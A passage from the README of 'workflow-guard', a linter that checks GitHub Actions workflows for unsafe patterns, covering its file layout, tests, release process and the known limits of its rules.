  in properties also `:` and `,`), so a file name or value with a line break can't end the
  annotation and start a different command on the next line.

```
src/workflow_guard/
  workflow.py  loading workflows and actions, node helpers, jobs/steps/triggers, inline ignores
  rules.py     the eight rules
  expressions.py  ${{ }} lexer and context paths (used by WG004 and WG005)
  conditions.py   if: parser and three-valued evaluator (WG010: who does the check let in?)
  shell.py     a small bash evaluator (WG010: does a run: script exit for strangers? what
               does it write to $GITHUB_OUTPUT? the commenter's association, login and
               permission API answer)
  jscript.py   a small JavaScript evaluator for actions/github-script (WG010: the same
               questions for core.setFailed, throw, core.setOutput and return)
  taint.py     WG004/WG007's tracker: untrusted values through env:, $GITHUB_*, job outputs
  calls.py     local reusable workflows and actions: what callers pass into each input
  project.py   the files checked together; which file a uses: ./... runs
  writes.py    what a script or github-script writes to $GITHUB_OUTPUT / ENV / PATH
  scripts.py   where a step's script text is: run:, github-script, actions that run an input
  config.py    .github/workflow-guard.yml: finding, reading and checking the settings file
  fix.py       --fix: GitHubResolver (API lookups), pin_actions (text edits), comment style
  sarif.py     --format sarif: rules, results, fingerprints, notifications
  annotations.py --format github: workflow commands, with GitHub's escaping
  model.py     Finding, Severity
  cli.py       arguments, file discovery, text/JSON/SARIF/GitHub output, exit codes
action.yml     the composite GitHub Action
scripts/release_check.py  the Release check workflow's script (versions, tags, releases, changelog)
scripts/release_notes.py  CHANGELOG.md <-> GitHub Release notes (notes, title, sync)
.pre-commit-hooks.yaml  the pre-commit hook
tests/         pytest: rules, CLI, SARIF, annotations, action.yml and the hook, and --fix
               (with a local HTTP server standing in for GitHub); fixtures/ holds an unsafe workflow
```

## Tests

```bash
pytest -q
ruff check . && ruff format --check .
```

CI runs them on Python 3.10, 3.12 and 3.14, and then runs workflow-guard on this repository's own
workflow, which pins its actions to commit SHAs. The `action` job runs `action.yml` itself on
Ubuntu and Windows.

## Releasing

1. In the pull request: bump the version in `pyproject.toml` and
   `src/workflow_guard/__init__.py`, and add its section at the top of
   [CHANGELOG.md](CHANGELOG.md): `## vX.Y.Z — Title`, then the release notes (headings start at
   `###`; the date can wait).
2. Merge, then tag the merge commit and push the tag: `git tag -a vX.Y.Z <sha>`,
   `git push origin vX.Y.Z`.
3. Publish the GitHub Release from that section:

   ```bash
   gh release create vX.Y.Z --verify-tag \
     --title "$(python scripts/release_notes.py title vX.Y.Z)" \
     --notes-file <(python scripts/release_notes.py notes vX.Y.Z)
   ```

The **Release check** workflow (`scripts/release_check.py`, standard library only) runs on pull
requests, pushes to main, `v*` tags and published releases. It fails when the two versions
disagree, when the version is older than the newest tag (a lost bump), when a pushed tag doesn't
match the code, or when an older tag has no release. It also fails when CHANGELOG.md has no
section for the version in the code or for a tag, isn't newest first, or says something else
than the GitHub Release (title or text; headings may be one level apart, and a first heading
that repeats the title is ignored). A missing tag or release for the newest version is a
warning, since that is the normal state between the steps above, and so is a wrong date. Run it
locally with `python scripts/release_check.py --releases` (needs the GitHub CLI). If a release
was edited on GitHub, `python scripts/release_notes.py sync` copies the releases into
CHANGELOG.md.

## Limitations

- The expression reader only extracts property paths; it doesn't evaluate expressions or check
  operator precedence. A computed key (`github.event[matrix.field].title`) can't be resolved,
  so it isn't reported.
- The write reader (`writes.py`) matches common shell patterns; it isn't a shell parser.
  `tee -a $GITHUB_OUTPUT`, writes inside functions or loops, variables holding the file name,
  PowerShell/Python `shell:` steps, and github-script calls spread over several lines aren't
  followed. Neither are outputs of remote actions and reusable workflows (`uses: owner/repo`):
  their `steps.<id>.outputs.*` / `needs.<job>.outputs.*` are trusted. Local ones are followed.
- Inputs of local reusable workflows and local actions are linked to their callers only when
  both files are checked in the same run (the default checks `.github/workflows/`, a root
  `action.yml` and `.github/actions/`). A reusable workflow or action that other repositories
  also use can't see those callers, so a clean local caller hides them. `toJSON(inputs)` isn't
  followed. Remote reusable workflows and actions (`uses: owner/repo/...@sha`) aren't read;
  only files in the repository being checked are.
- `.github/actions` is searched for `action.yml` at any depth, but other places for local
  actions (e.g. `tools/my-action/`) need to be passed as paths.
- The action needs `bash` (all GitHub-hosted runners have it, Windows included) and network
  access to PyPI for PyYAML.
- Not on PyPI or the GitHub Marketplace yet; install from the repository.
- WG004 looks at `run:`, `actions/github-script` and the actions listed under "Actions that run
  a script", plus the ones named with `--script-input`. Other actions can also run an input as
  code; they aren't known.
- WG010 knows the answers of one action's outputs (see How it works); for any other step an
  `if:` on the answer has to be false for an empty answer, `false`, `none` and `read`, so
  `!= 'false'` is reported even where the output is never empty. A check in a script of the
  repository (`require('./.github/scripts/check.js')`) isn't recognised, and a bash check of the
  association only in the forms `shell.py` follows (no arrays or `eval`). A script that asks the
  permission API and that the evaluator can't follow (an array, `eval`, a check of another
  user's permission, `env:` from the job or workflow) still counts when it has an `exit 1`
  anywhere (a guess from its text), and so does a github-script with an arrow function, a loop or a function (`core.setFailed`, `throw` or `process.exit(1)` in its text). A check that may be skipped covers a later step only when that step's `if:` repeats its condition word for word (as parsed); a condition that implies it in another way (`x == 'a'` for `x != 'b'`) isn't seen. A pull request's ref saved
  in a shell variable on one line and fetched on another isn't a checkout. A job output with an unknown part (`${{ github.run_id }}`)
  is unknown as a whole. Whether a script fails on a no is guessed from its text
  (`core.setFailed`, `throw`, `exit 1`, `grep -q`); a script that fails some other way
  (`set -e` with `test`, `[[ ]]` alone on a line) isn't recognised and is reported. `vars.*` and `secrets.*` are trusted as lists of people the owners chose. `cancelled()` is always taken as possible, so a job that only runs when the run is cancelled is reported after a check too. Only `issue_comment` is checked: `pull_request_review_comment` on a fork's pull
  request runs without secrets, like `pull_request`.
- WG009 looks for `actions/checkout`, git/gh commands in `run:` (one line at a time, with
  `\` continuations joined; the head reference must be on the same line as the command) and
  four common ways to download artifacts. Shell variables set inside the script (`SHA=...; git
  checkout $SHA`), other download actions, and what the job does with the files afterwards
  aren't analysed: any later `run:` step after an unpack into the workspace counts.
- WG001 doesn't check that a SHA really belongs to the repository's tag (a SHA from a fork works
  on GitHub too).
- `--fix` only fixes WG001. The other rules need a human decision (which permissions a job needs).
- The SARIF output isn't checked against the JSON schema in CI (it was checked by hand, see
  PROGRESS.md); the tests check the fields GitHub requires.
- The comment style is a heuristic: a `#` after whitespace inside a quoted string counts as a
  comment, and a `.prettierignore` that excludes `.github/` isn't read (use `--comment-spaces`).
- `--fix` doesn't look into GitHub Enterprise Server (the API URL is fixed to api.github.com).

## Next steps

See [PROGRESS.md](PROGRESS.md).

## License

MIT
